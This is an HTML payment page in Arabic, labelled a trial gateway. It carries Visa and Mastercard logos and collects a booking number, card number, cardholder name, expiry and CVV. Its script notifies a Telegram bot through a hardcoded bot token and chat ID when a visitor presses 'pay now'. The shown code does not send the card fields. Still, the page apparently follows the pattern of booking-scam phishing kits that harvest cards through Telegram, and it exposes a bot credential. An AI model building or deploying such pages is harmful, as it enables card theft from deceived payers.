<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>بوابة الدفع التجريبية</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      direction: rtl;
      background-color: #f5f5f5;
      margin: 0;
      padding: 0;
    }
    header, footer {
      background-color: #004080;
      color: white;
      text-align: center;
      padding: 20px 0;
    }
    main {
      padding: 20px;
    }
    form {
      background-color: white;
      padding: 20px;
      border-radius: 8px;
      max-width: 500px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    label {
      display: block;
      margin-top: 10px;
    }
    input, select {
      width: 100%;
      padding: 8px;
      margin-top: 5px;
      box-sizing: border-box;
    }
    button {
      margin-top: 20px;
      padding: 10px;
      width: 100%;
      background-color: #004080;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }
    .card-logos {
      display: flex;
      justify-content: center;
      gap: 20px;
    }
    .card-logos img {
      height: 50px;
    }
  </style>
</head>
<body>

  <header>
    <div class="card-logos">
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa Logo" />
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="MasterCard Logo" />
    </div>
  </header>

  <main>
    <form id="paymentForm">

      <label for="confirmBooking">تأكيد رقم الحجز (تجريبي):</label>
      <input type="text" id="confirmBooking" required />

      <label for="cardNumber">رقم البطاقة (تجريبي):</label>
      <input type="text" id="cardNumber" required />

      <label for="cardName">الاسم على البطاقة (تجريبي):</label>
      <input type="text" id="cardName" required />

      <label for="expiryMonth">الشهر:</label>
      <select id="expiryMonth" required>
        <option value="">--</option>
        <option>01</option><option>02</option><option>03</option>
        <option>04</option><option>05</option><option>06</option>
        <option>07</option><option>08</option><option>09</option>
        <option>10</option><option>11</option><option>12</option>
      </select>

      <label for="expiryYear">السنة:</label>
      <select id="expiryYear" required>
        <option value="">--</option>
        <option>2025</option><option>2026</option><option>2027</option>
        <option>2028</option><option>2029</option><option>2030</option>
      </select>

      <label for="cvv">CVV (تجريبي):</label>
      <input type="text" id="cvv" required />

      <button type="submit">ادفع الآن</button>
    </form>
  </main>

  <footer>
    جميع الحقوق محفوظة ©️ 2025 - نسخة تجريبية
  </footer>

  <script>
    document.getElementById("paymentForm").addEventListener("submit", function(e) {
      e.preventDefault();

      // رسالة تجريبية فقط
      const message = `
🚀 إشعار تجريبي
زائر جديد ضغط على زر "ادفع الآن"
`;

      // إرسال رسالة إلى بوتك على تليجرام
      fetch("https://api.telegram.org/bot7994339638:AAHgur93jAzxz55NZTtD5J3WKgDaWZtlV3E/sendMessage", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: "16420566",
          text: message
        })
      })
      .then(() => {
        alert("✅ تمت العملية التجريبية بنجاح! (تم إرسال إشعار إلى البوت)");
      })
      .catch(() => {
        alert("❌ فشل الاتصال بالبـوت");
      });
    });
  </script>

</body>
</html>
